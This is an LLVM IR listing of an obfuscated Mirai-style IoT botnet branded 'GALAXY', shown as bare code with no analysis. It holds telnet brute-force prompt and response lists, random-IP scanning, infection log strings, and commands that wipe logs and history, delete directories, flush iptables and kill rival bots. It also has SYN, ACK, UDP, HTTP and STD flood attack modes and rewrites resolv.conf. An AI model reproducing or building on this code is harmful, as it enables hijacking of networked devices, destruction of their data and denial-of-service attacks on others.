@.str.427 = private unnamed_addr constant [7 x i8] c"xxwkvy\00", align 1
@.str.428 = private unnamed_addr constant [7 x i8] c"hcgguc\00", align 1
@.str.429 = private unnamed_addr constant [7 x i8] c"tlrgju\00", align 1
@.str.430 = private unnamed_addr constant [7 x i8] c"yfdieg\00", align 1
@.str.431 = private unnamed_addr constant [7 x i8] c"kuvikr\00", align 1
@.str.432 = private unnamed_addr constant [7 x i8] c"kgymka\00", align 1
@.str.433 = private unnamed_addr constant [7 x i8] c"bxdusa\00", align 1
@.str.434 = private unnamed_addr constant [7 x i8] c"kmijih\00", align 1
@.str.435 = private unnamed_addr constant [7 x i8] c"cmnupe\00", align 1
@.str.436 = private unnamed_addr constant [7 x i8] c"jkuruo\00", align 1
@.str.437 = private unnamed_addr constant [7 x i8] c"hnqdok\00", align 1
@.str.438 = private unnamed_addr constant [7 x i8] c"vxemfi\00", align 1
@.str.439 = private unnamed_addr constant [7 x i8] c"xzdlvy\00", align 1
@Temp_Directorys = global [13 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.440, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.441, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.442, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.443, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.444, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.440, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.445, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.446, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.447, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.448, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.449, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.450, i32 0, i32 0), i8* null], align 16
@.str.440 = private unnamed_addr constant [7 x i8] c"/tmp/*\00", align 1
@.str.441 = private unnamed_addr constant [7 x i8] c"/var/*\00", align 1
@.str.442 = private unnamed_addr constant [11 x i8] c"/var/run/*\00", align 1
@.str.443 = private unnamed_addr constant [11 x i8] c"/var/tmp/*\00", align 1
@.str.444 = private unnamed_addr constant [16 x i8] c"/dev/netslink/*\00", align 1
@.str.445 = private unnamed_addr constant [7 x i8] c"/dev/*\00", align 1
@.str.446 = private unnamed_addr constant [11 x i8] c"/dev/shm/*\00", align 1
@.str.447 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.448 = private unnamed_addr constant [8 x i8] c"/boot/*\00", align 1
@.str.449 = private unnamed_addr constant [7 x i8] c"/usr/*\00", align 1
@.str.450 = private unnamed_addr constant [7 x i8] c"/opt/*\00", align 1
@advances = global [16 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.451, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.452, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.453, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.454, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.455, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.456, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.457, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.458, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.459, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.460, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.461, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.462, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.463, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.464, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.465, i32 0, i32 0), i8* null], align 16
@.str.451 = private unnamed_addr constant [8 x i8] c"mdm9625\00", align 1
@.str.452 = private unnamed_addr constant [9 x i8] c"9615-cdp\00", align 1
@.str.453 = private unnamed_addr constant [5 x i8] c"F600\00", align 1
@.str.454 = private unnamed_addr constant [5 x i8] c"F660\00", align 1
@.str.455 = private unnamed_addr constant [5 x i8] c"F609\00", align 1
@.str.456 = private unnamed_addr constant [4 x i8] c"BCM\00", align 1
@.str.457 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.458 = private unnamed_addr constant [5 x i8] c"user\00", align 1
@.str.459 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.460 = private unnamed_addr constant [5 x i8] c"name\00", align 1
@.str.461 = private unnamed_addr constant [5 x i8] c"pass\00", align 1
@.str.462 = private unnamed_addr constant [7 x i8] c"dvrdvs\00", align 1
@.str.463 = private unnamed_addr constant [5 x i8] c"nter\00", align 1
@.str.464 = private unnamed_addr constant [5 x i8] c"User\00", align 1
@.str.465 = private unnamed_addr constant [8 x i8] c"welcome\00", align 1
@fails = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.466, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.467, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.468, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.469, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.470, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.471, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.472, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.473, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.474, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.475, i32 0, i32 0), i8* null], align 16
@.str.466 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.467 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.468 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.469 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.470 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.471 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.472 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@.str.473 = private unnamed_addr constant [7 x i8] c"ailure\00", align 1
@.str.474 = private unnamed_addr constant [4 x i8] c"bye\00", align 1
@.str.475 = private unnamed_addr constant [5 x i8] c"exit\00", align 1
@successes = global [18 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.476, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.477, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.478, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.462, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.451, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.452, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.453, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.454, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.455, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.479, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.480, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.481, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.482, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.483, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.484, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.456, i32 0, i32 0), i8* null], align 16
@.str.476 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.477 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@.str.478 = private unnamed_addr constant [6 x i8] c"shell\00", align 1
@.str.479 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.480 = private unnamed_addr constant [8 x i8] c"version\00", align 1
@.str.481 = private unnamed_addr constant [2 x i8] c"v\00", align 1
@.str.482 = private unnamed_addr constant [7 x i8] c"system\00", align 1
@.str.483 = private unnamed_addr constant [8 x i8] c"command\00", align 1
@.str.484 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.466, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.467, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.468, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.469, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.470, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.471, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.472, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.476, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.477, i32 0, i32 0), i8* null], align 16
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.575 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.485 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.486 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@getRandomPublicIP.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.487 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@MiraiIPRanges.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.488 = private unnamed_addr constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00", align 1
@.str.489 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.490 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.491 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.492 = private unnamed_addr constant [12 x i8] c"iptables -F\00", align 1
@.str.493 = private unnamed_addr constant [17 x i8] c"pkill -9 busybox\00", align 1
@.str.494 = private unnamed_addr constant [14 x i8] c"pkill -9 perl\00", align 1
@.str.495 = private unnamed_addr constant [16 x i8] c"pkill -9 python\00", align 1
@.str.496 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.497 = private unnamed_addr constant [37 x i8] c"/sbin/iptables -F; /sbin/iptables -X\00", align 1
@.str.498 = private unnamed_addr constant [23 x i8] c"service firewalld stop\00", align 1
@.str.499 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.500 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@.str.501 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.502 = private unnamed_addr constant [72 x i8] c"[ GALAXY ] Result || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.503 = private unnamed_addr constant [11 x i8] c"rm -rf %s;\00", align 1
@.str.504 = private unnamed_addr constant [91 x i8] c"[ GALAXY ] Removing Temp Directorys. || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.505 = private unnamed_addr constant [27 x i8] c"pkill -9 %s;killall -9 %s;\00", align 1
@.str.506 = private unnamed_addr constant [78 x i8] c"[ GALAXY ] Bot Killing. || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.507 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.508 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.509 = private unnamed_addr constant [75 x i8] c"[ GALAXY ] Infecting || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.510 = private unnamed_addr constant [7 x i8] c"LINKED\00", align 1
@.str.511 = private unnamed_addr constant [85 x i8] c"[ GALAXY ] Infection Success. || IP: %s: || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.512 = private unnamed_addr constant [72 x i8] c"[ GALAXY ] Failed || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.513 = private unnamed_addr constant [10 x i8] c"connected\00", align 1
@SendSTD.randstrings = private unnamed_addr constant [24 x i8*] [i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.514, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.515, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.516, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.517, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.518, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.519, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.520, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.521, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.522, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.523, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.524, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.525, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.526, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.527, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.528, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.529, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.530, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.531, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.532, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.533, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.534, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.535, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.536, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.537, i32 0, i32 0)], align 16
@.str.514 = private unnamed_addr constant [21 x i8] c"PozHlpiND4xPDPuGE6tq\00", align 1
@.str.515 = private unnamed_addr constant [21 x i8] c"tg57YSAcuvy2hdBlEWMv\00", align 1
@.str.516 = private unnamed_addr constant [21 x i8] c"VaDp3Vu5m5bKcfCU96RX\00", align 1
@.str.517 = private unnamed_addr constant [21 x i8] c"UBWcPjIZOdZ9IAOSZAy6\00", align 1
@.str.518 = private unnamed_addr constant [21 x i8] c"JezacHw4VfzRWzsglZlF\00", align 1
@.str.519 = private unnamed_addr constant [21 x i8] c"3zOWSvAY2dn9rKZZOfkJ\00", align 1
@.str.520 = private unnamed_addr constant [21 x i8] c"oqogARpMjAvdjr9Qsrqj\00", align 1
@.str.521 = private unnamed_addr constant [21 x i8] c"yQAkUvZFjxExI3WbDp2g\00", align 1
@.str.522 = private unnamed_addr constant [21 x i8] c"35arWHE38SmV9qbaEDzZ\00", align 1
@.str.523 = private unnamed_addr constant [21 x i8] c"kKbPlhAwlxxnyfM3LaL0\00", align 1
@.str.524 = private unnamed_addr constant [21 x i8] c"a7pInUoLgx1CPFlGB5JF\00", align 1
@.str.525 = private unnamed_addr constant [21 x i8] c"yFnlmG7bqbW682p7Bzey\00", align 1
@.str.526 = private unnamed_addr constant [21 x i8] c"S1mQMZYF6uLzzkiULnGF\00", align 1
@.str.527 = private unnamed_addr constant [21 x i8] c"jKdmCH3hamvbN7ZvzkNA\00", align 1
@.str.528 = private unnamed_addr constant [21 x i8] c"bOAFqQfhvMFEf9jEZ89M\00", align 1
@.str.529 = private unnamed_addr constant [21 x i8] c"VckeqgSPaAA5jHdoFpCC\00", align 1
@.str.530 = private unnamed_addr constant [21 x i8] c"CwT01MAGqrgYRStHcV0X\00", align 1
@.str.531 = private unnamed_addr constant [21 x i8] c"72qeggInemBIQ5uJc1jQ\00", align 1
@.str.532 = private unnamed_addr constant [21 x i8] c"zwcfbtGDTDBWImROXhdn\00", align 1
@.str.533 = private unnamed_addr constant [21 x i8] c"w70uUC1UJYZoPENznHXB\00", align 1
@.str.534 = private unnamed_addr constant [21 x i8] c"EoXLAf1xXR7j4XSs0JTm\00", align 1
@.str.535 = private unnamed_addr constant [21 x i8] c"lgKjMnqBZFEvPJKpRmMj\00", align 1
@.str.536 = private unnamed_addr constant [21 x i8] c"lSvZgNzxkUyChyxw1nSr\00", align 1
@.str.537 = private unnamed_addr constant [21 x i8] c"VQz4cDTxV8RRrgn00toF\00", align 1
@.str.538 = private unnamed_addr constant [4 x i8] c"ALL\00", align 1
@.str.539 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.540 = private unnamed_addr constant [4 x i8] c"SYN\00", align 1
@.str.541 = private unnamed_addr constant [4 x i8] c"RST\00", align 1
@.str.542 = private unnamed_addr constant [4 x i8] c"FIN\00", align 1
@.str.543 = private unnamed_addr constant [4 x i8] c"ACK\00", align 1
@.str.544 = private unnamed_addr constant [4 x i8] c"PSH\00", align 1
@.str.545 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.546 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.547 = private unnamed_addr constant [5 x i8] c"ICMP\00", align 1
@.str.548 = private unnamed_addr constant [5 x i8] c"SREP\00", align 1
@.str.549 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.550 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.551 = private unnamed_addr constant [6 x i8] c"FLOAD\00", align 1
@.str.552 = private unnamed_addr constant [21 x i8] c"[SREP] FLoad Mode ON\00", align 1
@.str.553 = private unnamed_addr constant [6 x i8] c"MIRAI\00", align 1
@.str.554 = private unnamed_addr constant [21 x i8] c"FLoad Mode Activated\00", align 1
@.str.555 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.556 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.557 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.558 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.559 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.560 = private unnamed_addr constant [8 x i8] c"EXITFAG\00", align 1
@.str.561 = private unnamed_addr constant [6 x i8] c"CLEAN\00", align 1
@.str.562 = private unnamed_addr constant [19 x i8] c"[Cleaning] [%s:%s]\00", align 1
@.str.565 = private unnamed_addr constant [11 x i8] c"BIG_ENDIAN\00", align 1
@.str.566 = private unnamed_addr constant [14 x i8] c"LITTLE_ENDIAN\00", align 1
@.str.567 = private unnamed_addr constant [13 x i8] c"BIG_ENDIAN_W\00", align 1
@.str.568 = private unnamed_addr constant [16 x i8] c"LITTLE_ENDIAN_W\00", align 1
@.str.569 = private unnamed_addr constant [8 x i8] c"UNKNOWN\00", align 1
@.str.563 = private unnamed_addr constant [17 x i8] c"/etc/resolv.conf\00", align 1
@.str.564 = private unnamed_addr constant [39 x i8] c"nameserver 8.8.8.8\0Anameserver 8.8.4.4\0A\00", align 1
@.str.570 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.571 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.572 = private unnamed_addr constant [53 x i8] c"[\1B[96mINFECTED\1B[97m] Arch: \1B[96m%s \1B[97m|| Type: %s]\00", align 1
@.str.573 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.574 = private unnamed_addr constant [2 x i8] c" \00", align 1
@x = common global i32 0
@y = common global i32 0
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0
@x.57 = common global i32 0
@y.58 = common global i32 0
@x.59 = common global i32 0
@y.60 = common global i32 0
@x.61 = common global i32 0
@y.62 = common global i32 0
@x.63 = common global i32 0
@y.64 = common global i32 0
@x.65 = common global i32 0
@y.66 = common global i32 0
@x.67 = common global i32 0
@y.68 = common global i32 0
@x.69 = common global i32 0
@y.70 = common global i32 0
@x.71 = common global i32 0
@y.72 = common global i32 0
@x.73 = common global i32 0
@y.74 = common global i32 0
@x.75 = common global i32 0
@y.76 = common global i32 0
@x.77 = common global i32 0
@y.78 = common global i32 0
@x.79 = common global i32 0
@y.80 = common global i32 0
@x.81 = common global i32 0
@y.82 = common global i32 0
@x.83 = common global i32 0
@y.84 = common global i32 0
@x.85 = common global i32 0
@y.86 = common global i32 0
@x.87 = common global i32 0
@y.88 = common global i32 0
@x.89 = common global i32 0
@y.90 = common global i32 0
@x.91 = common global i32 0
@y.92 = common global i32 0
@x.93 = common global i32 0
@y.94 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = load i32, i32* @x.1
  %3 = load i32, i32* @y.2
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  %12 = load i32, i32* %10, align 4
  store i32 %12, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %13 = load i32, i32* %10, align 4
  %14 = add i32 %13, -1640531527
  store i32 %14, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %15 = load i32, i32* %10, align 4
  %16 = add i32 %15, -1640531527
  %17 = add i32 %16, -1640531527
  store i32 %17, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %11, align 4
  %18 = load i32, i32* @x.1
  %19 = load i32, i32* @y.2
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %63, %originalBBpart2
  %27 = load i32, i32* @x.1
  %28 = load i32, i32* @y.2
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %26
  %35 = load i32, i32* %11, align 4
  %36 = icmp slt i32 %35, 4096
  %37 = load i32, i32* @x.1
  %38 = load i32, i32* @y.2
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %36, label %45, label %66

; <label>:45:                                     ; preds = %originalBBpart224
  %46 = load i32, i32* %11, align 4
  %47 = sub nsw i32 %46, 3
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %48
  %50 = load i32, i32* %49, align 4
  %51 = load i32, i32* %11, align 4
  %52 = sub nsw i32 %51, 2
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %53
  %55 = load i32, i32* %54, align 4
  %56 = xor i32 %50, %55
  %57 = xor i32 %56, -1640531527
  %58 = load i32, i32* %11, align 4
  %59 = xor i32 %57, %58
  %60 = load i32, i32* %11, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %61
  store i32 %59, i32* %62, align 4
  br label %63

; <label>:63:                                     ; preds = %45
  %64 = load i32, i32* %11, align 4
  %65 = add nsw i32 %64, 1
  store i32 %65, i32* %11, align 4
  br label %26

; <label>:66:                                     ; preds = %originalBBpart224
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %67 = alloca i32, align 4
  %68 = alloca i32, align 4
  store i32 %0, i32* %67, align 4
  %69 = load i32, i32* %67, align 4
  store i32 %69, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %70 = load i32, i32* %67, align 4
  %_ = sub i32 0, %70
  %gen = add i32 %_, -1640531527
  %_1 = sub i32 %70, -1640531527
  %gen2 = mul i32 %_1, -1640531527
  %_3 = sub i32 %70, -1640531527
  %gen4 = mul i32 %_3, -1640531527
  %71 = add i32 %70, -1640531527
  store i32 %71, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %72 = load i32, i32* %67, align 4
  %_5 = sub i32 0, %72
  %gen6 = add i32 %_5, -1640531527
  %_7 = sub i32 %72, -1640531527
  %gen8 = mul i32 %_7, -1640531527
  %73 = add i32 %72, -1640531527
  %_9 = sub i32 %73, -1640531527
  %gen10 = mul i32 %_9, -1640531527
  %_11 = sub i32 0, %73
  %gen12 = add i32 %_11, -1640531527
  %_13 = sub i32 %73, -1640531527
  %gen14 = mul i32 %_13, -1640531527
  %_15 = shl i32 %73, -1640531527
  %_16 = sub i32 %73, -1640531527
  %gen17 = mul i32 %_16, -1640531527
  %_18 = sub i32 %73, -1640531527
  %gen19 = mul i32 %_18, -1640531527
  %_20 = sub i32 0, %73
  %gen21 = add i32 %_20, -1640531527
  %74 = add i32 %73, -1640531527
  store i32 %74, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %68, align 4
  br label %originalBB

originalBB22alteredBB:                            ; preds = %originalBB22, %26
  %75 = load i32, i32* %11, align 4
  %76 = icmp slt i32 %75, 4096
  br label %originalBB22
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = load i32, i32* @x.3
  %2 = load i32, i32* @y.4
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i64 18782, i64* %10, align 8
  store i32 -2, i32* %12, align 4
  %13 = load i32, i32* @rand_cmwc.i, align 4
  %14 = add i32 %13, 1
  %15 = and i32 %14, 4095
